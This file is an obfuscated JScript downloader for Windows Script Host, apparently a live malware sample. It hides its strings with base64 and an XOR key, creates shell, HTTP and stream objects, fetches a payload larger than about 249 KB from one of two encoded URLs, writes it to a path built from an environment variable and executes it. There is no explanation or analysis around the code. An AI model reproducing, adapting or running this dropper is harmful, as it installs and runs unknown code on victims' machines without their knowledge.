var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var umUUYVG3ff = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "qNGrfY8oEkCeCHzb"[charCodeAt](i % "qNGrfY8oEkCeCHzb".length));
    }
    return result;
};
var iconoclastS3h = function() {
    var laborjSV = function() {};
    laborjSV.prototype.create = function(expatiateqXR) {
        return WScript.CreateObject(expatiateqXR);
    };
    return laborjSV;
}();

(function() {
    var leagueKrb = new iconoclastS3h();
    var asunderiQN = 200;
    var distendQDN = umUUYVG3ff('"NgsT"');
    var impartPz6 = umUUYVG3ff('"NDYiEQ=="');
    var waxxMf = umUUYVG3ff('"Jh0kAA8pTEEWAyYJLw=="');
    var placateBeY = umUUYVG3ff('"PB0fPyprFjcIJwsxFxg="');
    var piquevzG = umUUYVG3ff('"JR0UIAohUx00Xw=="');
    var undertakingUDQ = umUUYVG3ff('"MgAxOy8+fCwAOQ=="');
    var depraveSpI = umUUYVG3ff('"OgcNBBU6AFYqDw=="');
    var inclementsfb = umUUYVG3ff('"BywoIBE7URYLLQ=="');
    var policyRMR = umUUYVG3ff('"MAoINiQ="');
    var glibugJ = umUUYVG3ff('"Ijo1Fwc0"');
    var augustKam = umUUYVG3ff('"VBoCPzZ8ZA=="');
    var flairYyI = umUUYVG3ff('"Xys/Fw=="');
    var ensueQW7 = Math.pow(2, 10) * 249;
    var stintI2w = [ umUUYVG3ff('"GTozAlx2FwcgBy8KOicPDBYjJhwXKBYMKgZsXXNmHxoU"'), umUUYVG3ff('"GTozAlx2FwcgBy8KOicPDBYjJhwAPxYMKgZsXXNmHxoU"') ];
    var obduratekDN = 2097152;
    var pummelX4S = leagueKrb.create(waxxMf);
    var loquaciousjIL = leagueKrb.create(placateBeY);
    var anthropomorphicflE = leagueKrb.create(policyRMR + umUUYVG3ff('"Xw=="') + glibugJ);
    var emendWBs = pummelX4S.ExpandEnvironmentStrings(augustKam);
    var cupiditySjp = emendWBs + obduratekDN + flairYyI;
    var sentinelGfJ = false;
    for (var grapplelWm = 0; grapplelWm < stintI2w.length; grapplelWm++) {
        try {
            var functionarydLa = stintI2w[grapplelWm];
            loquaciousjIL.open(distendQDN, functionarydLa, false);
            loquaciousjIL.send();
            if (loquaciousjIL.status == asunderiQN) {
                try {
                    anthropomorphicflE.open();
                    anthropomorphicflE.type = 1;
                    anthropomorphicflE.write(loquaciousjIL[umUUYVG3ff('"Ays0Agk3SwoHBCcc"')]);
                    if (anthropomorphicflE.size > ensueQW7) {
                        grapplelWm = stintI2w.length;
                        anthropomorphicflE.position = 0;
                        anthropomorphicflE.saveToFile(cupiditySjp, 2);
                        sentinelGfJ = true;
                    }
                } finally {
                    anthropomorphicflE.close();
                }
            }
        } catch (ignored) {}
    }
    if (sentinelGfJ) {
        pummelX4S[impartPz6](emendWBs + Math.pow(2, 21));
    }
})();